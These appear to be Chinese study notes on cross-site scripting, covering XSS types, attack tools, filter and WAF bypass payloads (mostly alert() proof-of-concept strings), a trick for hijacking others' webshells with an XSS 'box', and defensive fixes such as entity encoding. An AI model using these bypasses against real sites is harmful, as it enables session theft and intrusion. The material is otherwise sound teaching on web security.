# 漏洞产生原理

## XSS漏洞产生原理

通过给定异常的输入，黑客可以在你的浏览器中，插入一段恶意的 JavaScript 脚本，从而窃取你的隐私信息或者仿冒你进行操作。

## XSS漏洞危害影响

攻击者利用网站漏洞把恶意的脚本代码(通常包括HTML代码和客户端Javascript脚本)注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取Cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。

# 漏洞类型

## 1、反射型

在url上

有些后端上会通过url参数获取，将脚本放到url上，通过诱导点击链接达到目的

x=123 => x.php => 回包

## 2、存储型

比如日志，评论等地方

可获取cookie

x=123 => x.php => 写入数据库 => x.php => 回显

## 3、DOM型

x=123 => 本地浏览器静态前端代码 =x.php HTML DOM 定义了访问和操作HTML的标准方法。DOM将HTML表达为树结构

注：DOM型是反射型的一种表现

# XSS危害利用

### 1、钓鱼欺骗

### 2、网站挂马

### 3、身份盗用

### 4、盗取网站用户信息

### 5、垃圾信息发送

### 6、劫持用户Web行为

### 7、XSS蠕虫

# 漏洞手法

### XSS平台使用

利用xss平台配合postman方法

[自己搭建XSS平台](https://blog.csdn.net/u011781521/article/details/53895363)

### XSS工具使用

beef-xss

绕过WAF工具：

1、xsstrike

主要特点是进行反射XSS和DOM XSS扫描

2、xwaf(注入时用)

xsstrike这款工具甚至可以实时检测是否过了waf

3、www.xssfuzzer.com/fuzzer.html

标签语法替换，生成各种标签payload

4、ApiPost

5、Postman

### XSS结合其他漏洞

Shell箱子反杀

简而言之就是“黑吃黑”，在别人的webshell中写入自己的webshell，以达到写入后门的效果。

https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw?_at_=1643369648846

解压密码：xiao

在后门制作XSS箱子

```php
$url=$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']
```

（.为连接号）

接口规则：

http://asp-muma.com/api.asp?url=http://127.0.0.1/1.asp&pass=admin&id=1

改为

http://箱子所在服务器ip/api.asp?url=$url&pass=$password&id=1(id可写可不写)

将思想多用于留言板，评论区，订单系统，反馈条件，建议等。

### 注：

通过数据包中的代理（Agent）、同源策略（Referer）、Cookie注入。关键一点：在页面上某些地方显示出数据的地方都可能存在注入点。

# XSS绕过

## 代码过滤

<BODY onload="alert("XSS)">

## Http Only

如果HTTP响应头中包含HttpOnly标志，只要浏览器支持HttpOnly标志，客户端脚本（js）就无法访问cookie。因此，即使存在跨站点脚本（XSS）缺陷，且用户意外访问利用此漏洞的链接，浏览器也不会向第三方透露cookie。如果浏览器不支持HttpOnly并且网站尝试设置HttpOnlycookie，浏览器会忽略HttpOnly标志，从而创建一个传统的，脚本可访问的cookie。将cookie设置成HttpOnly是为了防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。

注：Http Only只是无法读取cookie信息，而不能阻止XSS攻击。

#### 绕过HTTP Only

1、保存读取（利用XSS平台的获取浏览器明文账号和密码方式）

2、未保存读取（可采用表单劫持方式）

必要条件为登录框

## 前端绕过

burp抓包改包绕过

## 双写绕过

## 事件绕过

1、onclick

2、onmousemove

## 大小写绕过

## 注释干扰绕过

<scri<!--test-->pt>alert(1);</scr<!--test-->ipt>

## 伪协议绕过

```html

111"><a href="javascript:alert(document.domain)"></a>
<table background="javascript:alert(/xss/)"></table>
<img src="javascript:alert('xss');">

```

## 空格回车Tab绕过

1、空格

```html
<img src=“jav     ascript:alert('xss')";>
```

2、Tab

```html
<img src="java sc		ript:alert('xss');">
```

3、回车

```html
<img src="jav
          ascript:
          alert('xss');">
```

## 编码绕过

### base64编码

如果过滤了<> ' " script，可以用base64编码

```html
<a href="data;text/html;base64,XXXXXXXXXX">text</a>
```

eval("")eval函数

可用于以下情况

1、<a href="可控点">

2、<iframe src="可控点">

### JS编码

1、八进制

2、十六进制

3、Unicode

4、转义字符

### HTML实体编码

1、字符编码：十进制、十六进制编码，样式为"&#数值;"，如"<" 编码为"&#060；"

```html
<img src="x" onerror="&#97;...">
```

2、html5新增的实体命名编码

```
&colon; => [冒号]
&NewLink; => [换行]
<a href="javasc&NewLink;ript&colon;alert(1)">click</a>
```

### URL编码

1、进行两次URL全编码

## CSS

#### 利用IE特性绕过XSS过滤

1、IE中两个反单引号"可以闭合一个左边双引号

"onmousemove=alert(1)

#### 利用CSS特性绕过XSS过滤

background-color:#f00;background:url("javascript:alert(document.domain);");

#### IE中利用CSS触发XSS

CSS中的注释/**/

xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1;})

# 注：检测来源：同源策略（是否同一域名）

### WAF拦截

#### 标签语法替换

#### 特殊符号干扰

#### 提交方式更改（POST/GET/REQUEST）

#### 垃圾数据溢出

#### 加密解密算法

#### 结合其他漏洞绕过

www.bbs.pediy.com/thread-250852.html

# XSS修复及安全修复方案

## 1. 恶意数据出现在标签内

```html
<body>
...恶意数据
</body>
```

修复方案

使用HTML实体编码对以下字符编码:

```text
& --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
 / --> &#x2F;
```

修复代码示例

```jsp
String parameter = request.getParameter("xss");
parameter = ESAPI.encoder().encodeForHTML(parameter);//owasp官方api进行html实体编码
response.getWriter().write("<body>"+parameter+"</body>");
```

## 2. 恶意数据出现在普通属性内

```html
<input value="恶意数据" />
<input value='恶意数据' />
<input value=恶意数据 />
```

修复方案

 a、对以下字符进行过滤

```text
[space]
<
>
=
'
"
%
/
```

```java
String[] filter = new String[]{" ","<",">","'","\"","%","/",""};
String parameter = request.getParameter("xss");
for( String f:filter){
    parameter = parameter.replaceAll(f,"");
}
```

b、使用HTML实体编码对以下字符编码

```text
& --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
 / --> &#x2F;
```

## 3. 恶意数据出现在特殊属性中

某些特殊属性(src、href、srcdoc),可以插入js执行

```text
<a href="恶意数据" >链接</a>
```

修复方案

1. href内进行URL编码
2. src及srcdoc等可以进行JavaScript编码
3. 过滤下列字符:
   \``` [space] <
   = ' " % ```

## 4. 恶意数据出现在javascript变量中

```html
<script>
    var test = '恶意数据';
</script>
```

修复方案

a. 对以下字符进行过滤

```text
[space]
<
>
=
'
"
%
/
```

b. 使用HTML实体编码对以下字符编码

```text
& --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
 / --> &#x2F;
```

## 5. 恶意数据出现在javascript注释中

```js
//var test = '恶意数据';
```

修复方案

a. 对以下字符进行过滤

```text
[space]
<
>
=
'
"
%
/
```

b. 使用HTML实体编码对以下字符编码

```text
& --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
 / --> &#x2F;
```

Cookie和Session的区别

Cookie和Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。Cookie一般用来保存用户信息比如

​	①.我们在Cookie中保存已经登录过的用户信息，下次访问网站的时候页面可以自动帮你填写登录的一些基本信息。

​	②.一般的网站都会有保持登录也就是说下次你在访问网站的时候不需要重新登录，这是因为用户登录的时候我们可以存放一个Token在Cookie中，下次登录的时候只需要根据Token值来查找用户即可（为了安全考虑，重新登陆一般要将Token重写）

​	③.登录一次网站后访问网站其他页面不需要重新登录。Session的主要作用就是通过服务端记录用户德状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为HTTP协议是无状态的。服务端给特定的用户创建特定的Session之后就可以标识这个用户并跟踪此用户。Cookie数据保存在客户端（浏览器端），Session数据保存在服务器端。相对来说Session安全性更高，如果使用Cookie的一些敏感信息不要写入Cookie中，最好能将Cookie信息加密然后使用到的时候再去服务器端解密。

​	④.若网站采用session验证，则盗取cookie攻击无效。

总结

|          | Cookie                               | Session                               |
| -------- | ------------------------------------ | ------------------------------------- |
| 安全性   | 低于Session，可利用加密存放到Seesion | 高于Cookie，一般关键信息存放于Session |
| 存放于   | 浏览器（客户端）                     | 服务器（服务端）                      |
| 存活时间 | 存活时间较长                         | 存活时间较短                          |

安全性：

我们盗取的cookie中若没有session，是无法登录后台的，因为cookie存储在本地，我们可以盗取，而session存储在服务器上，我们无法获取！所以说比较安全你的网站都用session存储。想要获取需要有一些辅助条件，比如xss跳转到phpinfo界面，并且返回给我们源代码。



## 关于htmlspecialchars()函数

htmlspecialchars()函数把预定义的字符转换为HTML实体

预定义的字符是：
&（和号）成为 &amp

"（双引号）成为 &quot

'（单引号）成为 &#039

<（小于）成为 &lt

\>（大于）成为 &gt



# Flash XSS

Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。

本地Flash和远程Flash

### 关键函数

```javascript
allowScriptAccess()
allowNetworking()
```

### Flash跨域请求

受crossdomain.xml文件影响

该文件主要作用就是当被Flash请求到本域资源的时候，是否允许请求。

### Flash XSS攻击分类

#### 1、Flash缺陷参数-getURL

Flash提供相关的函数，可以执行js代码，getURL【AS2中支持】，navigateToURL【AS3中支持】，ExternalInterface.call。 

#### 2、Flash缺陷参数-ExternalInterface.call(参数一)

ExternalInterface.call同样是一个Flash提供的可以执行js的接口函数， ExternalInterface.call函数有两个参数，形如ExternalInterface.call("函数名","参数1")。

#### 3、Flash缺陷参数-ExternalInterface.call(参数二)

当反编译swf之后，会发现可控的参数的输出位置在ExternalInterface.call函数的第二个参数，方法和思路与第一个参数的时候类似。

#### 4、Flash缺陷参数addcallback与lso结合

这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。

#### 5、跨站Flash

跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用loadMove函数等加载第三方Flash。
